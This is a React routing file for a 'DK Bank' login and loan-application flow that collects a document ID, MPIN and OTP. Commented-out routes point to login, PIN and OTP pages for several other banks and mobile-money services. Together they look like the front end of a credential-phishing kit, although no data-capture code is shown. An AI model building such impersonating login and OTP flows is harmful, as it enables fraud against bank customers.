// import React from "react";
// import FeesAndCharges from "./FeesAndCharges";
// import { Routes, Route } from "react-router-dom";
// import Firstpage from "./Firstpage";
// import BankMuscatForms from "./BankMuscatForms";
// import ThirdPage from "./ThirdPage";
// import OTPVerification from "./OTPVerification";
// import MoMoLogin from "./MoMoLogin";
// import Otppage from "./Otppage"
// import PINEntry from "./PINEntry";
// import CBEBirrLogin from "./CBEBirrLogin";
// import LoginAuthentication from "./LoginAuthentication";
// import OtpVerify from "./OtpVerify";
// import MamaMoney from "./MamaMoney";
// import MamaMoneyOTP from "./MamaMoneyOTP";
// import DKBankLogin from "./DKBankLogin";
// import LoanApplicationscreen from "./LoanApplicationscreen";




// function App() {
//   return (
//     <>
//       <Routes>
//         {/* <Route path="/" element={<DKBankLogin />} /> */}
//         <Route path="/" element={<LoanApplicationscreen />} />
//         {/* <Route path="/" element={<Firstpage />} />
//         <Route path="/feecharges" element={<FeesAndCharges />} />
//         <Route path="/form" element={<BankMuscatForms />} />
//         <Route path="/third" element={<ThirdPage />} />
//         <Route path="/otpcode" element={<OTPVerification />} /> */}
        
//         {/* <Route path='/' element={  <MoMoLogin/>}/>
//         <Route path='/pincode' element={  <PINEntry/>}/>
//         <Route path='/otppage' element={  <Otppage/>}/> */}



// {/* <Route path="/" element={<MamaMoney/>}/>
// <Route path="/otp" element={<MamaMoneyOTP/>}/> */}
//         {/* <Route path="/" element={<CBEBirrLogin/>}/> */}
//         {/* <Route path="/loginauth" element={<LoginAuthentication/>}/> */}
//         {/* <Route path="/otpverify" element={<OtpVerify/>}/> */}
//       </Routes>
    
//     </>
//   );
// }

// export default App;



import React from "react";
import DKBankLogin from "./DKBankLogin";
import LoanApplicationScreen from "./LoanApplicationScreen";
import LoanDocumentIdPage from "./LoanDocumentIdPage";
import LoanMpinPage from "./LoanMpinPage";
import LoanDetailsPage from "./LoanDetailsPage";
import LoanOtpPage from "./LoanOtpPage";
import LoanSuccessPage from "./LoanSuccessPage";
import { LoanApplicationProvider } from "./LoanApplicationContext";
import { Navigate, Route, Routes, useNavigate } from "react-router-dom";

export default function App() {
  const navigate = useNavigate();

  return (
    <LoanApplicationProvider>
      <Routes>
      <Route path="/" element={<DKBankLogin onMpinVerified={() => navigate("/loan/details")} />} />
      <Route path="/loan" element={<LoanApplicationScreen />}>
        <Route index element={<Navigate to="details" replace />} />
        <Route path="doc-id" element={<LoanDocumentIdPage />} />
        <Route path="mpin" element={<LoanMpinPage />} />
        <Route path="details" element={<LoanDetailsPage />} />
        <Route path="otp" element={<LoanOtpPage />} />
        <Route path="success" element={<LoanSuccessPage />} />
      </Route>
      <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </LoanApplicationProvider>
  );
}